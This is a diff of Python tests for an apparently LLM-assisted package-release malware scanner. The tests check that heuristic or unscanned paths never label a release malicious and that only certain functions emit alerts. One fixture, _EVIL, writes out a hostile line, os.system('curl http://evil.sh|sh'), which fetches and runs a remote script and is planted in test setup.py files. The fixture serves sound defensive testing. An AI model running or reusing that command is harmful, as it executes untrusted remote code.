@@ -1,7 +1,8 @@
 """Only the model (or a person) says "malicious".
 
-Deterministic checks may clear a release or escalate it, but never label it malicious: heuristic alerts are
-`suspicious-heuristic`, and an unscanned release records `suspicious` with model 'none'. These tests pin that
+Deterministic checks may clear a release or escalate it, but never label it malicious: a release no model reviewed
+either waits in the review queue with no alert, or, when it cannot be scanned, alerts `suspicious-heuristic` with
+`UNREVIEWED:`, and an unscanned release records `suspicious` with model 'none'. These tests pin that
 on every non-LLM path, and a static check stops new code from minting a malicious Verdict outside the two
 sanctioned places: the reviewer's model-JSON parser and the human `adjudicate` label."""
 import ast
@@ -44,10 +45,13 @@ def _conn(cfg):
     return conn
 
 
-def _assert_never_malicious(conn, stage=None):
+def _assert_never_malicious(conn, stage=None, *, alerted=True):
     verdicts = [r[0] for r in conn.execute("SELECT classification FROM verdicts")]
     alerts = conn.execute("SELECT classification, dedupe_key FROM alerts").fetchall()
-    assert alerts, "the path under test must have alerted"
+    if alerted:
+        assert alerts, "the path under test must have alerted"
+    else:
+        assert alerts == [], "only a model verdict, a person or an unscanned outcome alerts"
     assert "malicious" not in verdicts
     assert "malicious" not in [a["classification"] for a in alerts]
     if stage:     # the outcome under test really ran
@@ -62,7 +66,7 @@ _EVIL = (b"import os, base64, requests\n"
          b"os.system('curl http://evil.sh|sh')\n")
 
 
-def test_heuristic_only_high_score_is_suspicious_heuristic_not_malicious(tmp_path):
+def test_heuristic_only_high_score_is_queued_without_an_alert(tmp_path):
     cfg = _cfg(tmp_path, reviewer_enabled=False)
     conn = _conn(cfg)
     art = ArtifactSet("p", "1.1", "1.0", "sdist", {"setup.py": _EVIL, "p/__init__.py": _EVIL},
@@ -71,8 +75,11 @@ def test_heuristic_only_high_score_is_suspicious_heuristic_not_malicious(tmp_pat
     orchestrator._process_fetched(cfg, conn, None, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5), art)
     score = conn.execute("SELECT triage_score FROM releases WHERE version='1.1'").fetchone()[0]
     assert score >= 150                  # far past threshold_t: the strongest heuristic case
-    assert store.get_stage(conn, "p", "1.1") == "alerted"
-    _assert_never_malicious(conn)
+    assert store.get_stage(conn, "p", "1.1") == "pending_review"
+    row = conn.execute("SELECT pending_reason, review_input_chars, evidence IS NULL FROM releases "
+                       "WHERE version='1.1'").fetchone()
+    assert tuple(row) == ("reviewer_disabled", 0, 1)
+    _assert_never_malicious(conn, alerted=False)
 
 
 # --- every unscanned outcome ---------------------------------------------------------------------------
@@ -123,7 +130,9 @@ def _escalate(tmp_path, diff=_DIFF, tr=_TR, fail=False, offline=False, **rv):
 
 def test_too_large_never_malicious(tmp_path):
     big = Diff("p", "1.1", False, [FileDiff("setup.py", "modified", [Hunk((0, 1), (0, 1), ["x" * 50_000], [])])], [])
-    _assert_never_malicious(_escalate(tmp_path, diff=big, max_input_chars=10_000), "too_large")
+    conn = _escalate(tmp_path, diff=big, max_input_chars=10_000)
+    assert store.pending_reviews(conn)[0]["pending_reason"] == "too_large"
+    _assert_never_malicious(conn, alerted=False)
 
 
 def test_review_failed_exhausted_never_malicious(tmp_path):
@@ -143,13 +152,13 @@ def test_reviewer_with_no_content_records_model_none_suspicious(tmp_path):
 def test_endpoint_unreachable_park_never_malicious(tmp_path):
     conn = _escalate(tmp_path, offline=True)
     assert store.pending_reviews(conn)[0]["pending_reason"] == "endpoint_unreachable"
-    _assert_never_malicious(conn)
+    _assert_never_malicious(conn, alerted=False)
 
 
 def test_llm_down_with_retries_left_never_malicious(tmp_path):
     conn = _escalate(tmp_path, fail=True, max_review_attempts=3)
     assert store.pending_reviews(conn)[0]["pending_reason"] == "review_failed"
-    _assert_never_malicious(conn)
+    _assert_never_malicious(conn, alerted=False)
 
 
 # --- static: nothing else mints a malicious Verdict ----------------------------------------------------
@@ -230,3 +239,42 @@ def test_one_oversized_source_alone_goes_to_no_content_not_malicious(tmp_path):
     row = conn.execute("SELECT classification, model FROM verdicts").fetchone()
     assert (row["classification"], row["model"]) == ("suspicious", "none")
     _assert_never_malicious(conn, "no_content")
+
+
+# --- static: only the model, the unscanned path or a person alerts ----------------------------------------------
+
+# The only functions in orchestrator.py that may call notifier.emit (spec B §4): _record (the model's malicious and
+# the weak-malicious suspicious), _alert_unscanned (could-not-scan outcomes, never malicious) and adjudicate.
+# This guard parses orchestrator.py only and catches direct `emit(...)` calls only: an alias, a `getattr`, or a new
+# path through an allowed function (e.g. a new caller of _alert_unscanned) is caught only by the behavioural tests
+# in test_no_heuristic_alerts.py.
+EMITTERS = {"_record", "_alert_unscanned", "adjudicate"}
+
+
+def emit_sites(source):
+    """Every `emit(...)` / `notifier.emit(...)` call outside EMITTERS, as 'line in function()'."""
+    out = []
+
+    def walk(node, func):
+        for child in ast.iter_child_nodes(node):
+            f = child.name if isinstance(child, (ast.FunctionDef, ast.AsyncFunctionDef)) else func
+            if isinstance(child, ast.Call):
+                fn = child.func
+                name = fn.attr if isinstance(fn, ast.Attribute) else fn.id if isinstance(fn, ast.Name) else None
+                if name == "emit" and func not in EMITTERS:
+                    out.append(f"orchestrator.py:{child.lineno} emit in {func}()")
+            walk(child, f)
+
+    walk(ast.parse(source), None)
+    return out
+
+
+def test_static_emit_check_catches_a_planted_violation():
+    assert emit_sites("def _review_escalated(c, v):\n    notifier.emit(c, None, v, 1)\n")
+    assert emit_sites("def _drain_one(c, v):\n    emit(c, None, v, 1)\n")
+    assert emit_sites("notifier.emit(c, None, v, 1)\n")                            # module level
+    assert not emit_sites("def _record(c, v):\n    notifier.emit(c, None, v, 1)\n")
+
+
+def test_only_the_model_the_unscanned_path_or_a_person_alerts():
+    assert emit_sites((PKG / "orchestrator.py").read_text()) == []
